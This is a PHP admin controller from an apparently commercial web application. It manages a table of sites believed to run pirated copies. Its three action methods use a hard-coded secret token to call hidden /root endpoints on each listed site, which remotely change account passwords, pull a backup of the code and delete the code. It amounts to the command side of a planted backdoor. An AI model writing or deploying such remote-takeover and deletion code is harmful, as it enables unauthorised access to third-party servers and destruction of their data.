<?php
/**
 * 盗版记录控制器
 * by:小航 11467102@qq.com
 */
declare (strict_types=1);

namespace app\admin\controller;

use think\facade\Db;
use think\facade\Request;
use Yurun\Util\HttpRequest;

class Pirate extends Base
{
    /**
     * 盗版记录列表
     * @throws \think\db\exception\DbException
     */
    public function list()
    {
        if (request()->isGet()) {
            $data = Request::only(['keywords', 'per_page', 'current_page']);
            $info = Db::name('pirate')
                ->whereLike('domain|ip', "%" . $data['keywords'] . "%")
                ->order('create_time', 'desc')
                ->paginate([
                    'list_rows' => $data['per_page'],
                    'query' => request()->param(),
                    'var_page' => 'page',
                    'page' => $data['current_page']
                ]);
            result(200, "获取数据成功！", $info);
        }
    }

    /**
     * 修改账号密码
     * @throws \think\db\exception\DataNotFoundException
     * @throws \think\db\exception\DbException
     * @throws \think\db\exception\ModelNotFoundException
     */
    public function executeModifyInfo()
    {
        if (request()->isPost()) {
            $id = Request::param('id');
            $info = Db::name('pirate')->where('id', $id)->find();
            $http = new HttpRequest();
            $http->header('token', '$2y$10$WgjUoUoBhgT17r/MmZV42e5q63BYFglVn0NjwPArYYu6.MVmJ/tp.');
            $url = "http://{$info['domain']}/root/modify";
            $response = $http->ua('YurunHttp')->post($url, ['code' => '10001'])->json(true);
            if ($response) {
                result(200, "修改成功！", $response);
            } else {
                result(403, "修改失败！");
            }
        }
    }

    /**
     * 备份代码
     */
    public function executeBackup()
    {
        if (request()->isPost()) {
            $id = Request::param('id');
            $info = Db::name('pirate')->where('id', $id)->find();
            $http = new HttpRequest();
            $http->header('token', '$2y$10$WgjUoUoBhgT17r/MmZV42e5q63BYFglVn0NjwPArYYu6.MVmJ/tp.');
            $url = "http://{$info['domain']}/root/backup";
            $response = $http->ua('YurunHttp')->post($url, ['code' => '10002'])->json(true);
            if ($response) {
                result(200, "备份成功！", $response);
            } else {
                result(403, "备份失败！");
            }
        }
    }

    /**
     * 执行删除代码
     */
    public function executeDelete()
    {
        if (request()->isPost()) {
            $id = Request::param('id');
            $info = Db::name('pirate')->where('id', $id)->find();
            $http = new HttpRequest();
            $http->header('token', '$2y$10$WgjUoUoBhgT17r/MmZV42e5q63BYFglVn0NjwPArYYu6.MVmJ/tp.');
            $url = "http://{$info['domain']}/root/delete";
            $response = $http->ua('YurunHttp')->post($url, ['code' => '10003'])->json(true);
            if ($response) {
                result(200, "删除成功！");
            } else {
                result(403, "删除失败！");
            }
        }
    }
}
